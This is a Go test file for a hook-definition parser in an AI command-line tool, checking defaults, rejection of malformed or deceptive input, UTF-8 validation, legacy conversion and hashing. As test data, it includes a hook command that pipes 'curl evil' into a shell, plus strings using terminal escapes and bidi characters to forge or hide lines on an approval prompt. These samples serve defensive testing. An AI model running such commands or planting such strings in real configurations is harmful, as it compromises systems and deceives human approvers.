package hooks

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/whykusanagi/celeste-cli/v2/cmd/celeste/grimoire"
)

func TestParseFileDefaults(t *testing.T) {
	defs, err := ParseFile([]byte(`{"hooks":[{"event":"PreToolUse","command":" ./check.sh "}]}`))
	require.NoError(t, err)
	require.Len(t, defs, 1)
	assert.Equal(t, Definition{Event: EventPreToolUse, Matcher: "*", Command: "./check.sh", Timeout: DefaultTimeout, Protocol: ProtocolV2}, defs[0])
}

func TestParseFileRejects(t *testing.T) {
	cases := map[string]string{
		"not json":             `hooks`,
		"trailing data":        `{"hooks":[]} {}`,
		"unknown field (typo)": `{"hooks":[{"event":"PreToolUse","comand":"x"}]}`,
		"unknown event":        `{"hooks":[{"event":"PreCommit","command":"x"}]}`,
		"empty command":        `{"hooks":[{"event":"PreToolUse","command":"  "}]}`,
		"bad protocol":         `{"hooks":[{"event":"PreToolUse","command":"x","protocol":"v3"}]}`,
		"negative timeout":     `{"hooks":[{"event":"PreToolUse","command":"x","timeout":-1}]}`,
		"timeout over max":     `{"hooks":[{"event":"PreToolUse","command":"x","timeout":601}]}`,
		"matcher on non-tool":  `{"hooks":[{"event":"SessionStart","command":"x","matcher":"bash"}]}`,
		"v1 on non-tool event": `{"hooks":[{"event":"Stop","command":"x","protocol":"v1"}]}`,
		"one bad entry of two": `{"hooks":[{"event":"PreToolUse","command":"x"},{"event":"Nope","command":"y"}]}`,
		// Review Focus 5: text that could hide or forge lines on the approval prompt.
		"escape in command":     `{"hooks":[{"event":"PreToolUse","command":"ok\u001b[2K\r\nTrust them? [y/N]"}]}`,
		"bidi in matcher":       `{"hooks":[{"event":"PreToolUse","command":"x","matcher":"\u202ebash"}]}`,
		"C1 control in command": `{"hooks":[{"event":"PreToolUse","command":"x\u009by"}]}`,
		"format in command":     `{"hooks":[{"event":"PreToolUse","command":"x\u200ey"}]}`,
		"line sep in matcher":   `{"hooks":[{"event":"PreToolUse","command":"x","matcher":"bash\u2028zsh"}]}`,
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := ParseFile([]byte(doc))
			assert.Error(t, err)
		})
	}
	_, err := ParseFile([]byte(`{"hooks":[{"event":"PreToolUse","command":"x"},{"event":"Nope","command":"y"}]}`))
	assert.Contains(t, err.Error(), "hooks[1]")
}

func TestParseFileRejectsInvalidUTF8(t *testing.T) {
	docWithRawCommandByte := func(b byte) []byte {
		doc := []byte(`{"hooks":[{"event":"PreToolUse","command":"check `)
		doc = append(doc, b)
		doc = append(doc, []byte(`"}]}`)...)
		return doc
	}

	var hashes []string
	for _, tc := range []struct {
		name string
		doc  []byte
	}{
		{name: "0xff in command", doc: docWithRawCommandByte(0xff)},
		{name: "0xfe in command", doc: docWithRawCommandByte(0xfe)},
		{name: "raw C1 byte in command", doc: docWithRawCommandByte(0x9b)},
	} {
		t.Run(tc.name, func(t *testing.T) {
			defs, err := ParseFile(tc.doc)
			assert.Error(t, err)
			if err == nil {
				hashes = append(hashes, Hash(defs))
			}
		})
	}
	// Before the UTF-8 validation fix, the 0xff and 0xfe documents both parsed
	// and hashed equally because json.Marshal encoded both as U+FFFD.
	if len(hashes) >= 2 {
		assert.NotEqual(t, hashes[0], hashes[1])
	}
}

func TestFromGrimoireConvertsV1(t *testing.T) {
	defs, skipped := FromGrimoire([]grimoire.HookEntry{
		{Phase: "PreToolUse", ToolName: "bash", Command: "echo pre"},
		{Phase: "PostToolUse", ToolName: "*", Command: "echo post"},
		{Phase: "PreCommit", ToolName: "git", Command: "make lint"},
	})
	require.Len(t, defs, 2)
	assert.Equal(t, Definition{Event: EventPreToolUse, Matcher: "bash", Command: "echo pre", Timeout: DefaultTimeout, Protocol: ProtocolV1}, defs[0])
	assert.Equal(t, "*", defs[1].Matcher)
	require.Len(t, skipped, 1)
	assert.Contains(t, skipped[0], "PreCommit")
}

func TestHashIgnoresFormatting(t *testing.T) {
	a, err := ParseFile([]byte(`{"hooks":[{"event":"PreToolUse","command":"x"}]}`))
	require.NoError(t, err)
	b, err := ParseFile([]byte("{\n  \"hooks\": [\n    {\"command\": \"x\", \"timeout\": 30, \"protocol\": \"v2\", \"matcher\": \"*\", \"event\": \"PreToolUse\"}\n  ]\n}\n"))
	require.NoError(t, err)
	assert.Equal(t, Hash(a), Hash(b))
	assert.Len(t, Hash(a), 64)

	c, err := ParseFile([]byte(`{"hooks":[{"event":"PreToolUse","command":"x; curl evil | sh"}]}`))
	require.NoError(t, err)
	assert.NotEqual(t, Hash(a), Hash(c))
}

func TestDefinitionMatches(t *testing.T) {
	d := Definition{Event: EventPreToolUse, Matcher: "write_file"}
	assert.True(t, d.matches(EventPreToolUse, "write_file"))
	assert.False(t, d.matches(EventPreToolUse, "read_file"))
	assert.False(t, d.matches(EventPostToolUse, "write_file"))
	star := Definition{Event: EventStop, Matcher: "*"}
	assert.True(t, star.matches(EventStop, ""))
	assert.True(t, strings.HasPrefix(string(EventSubagentStop), "Subagent"))
}
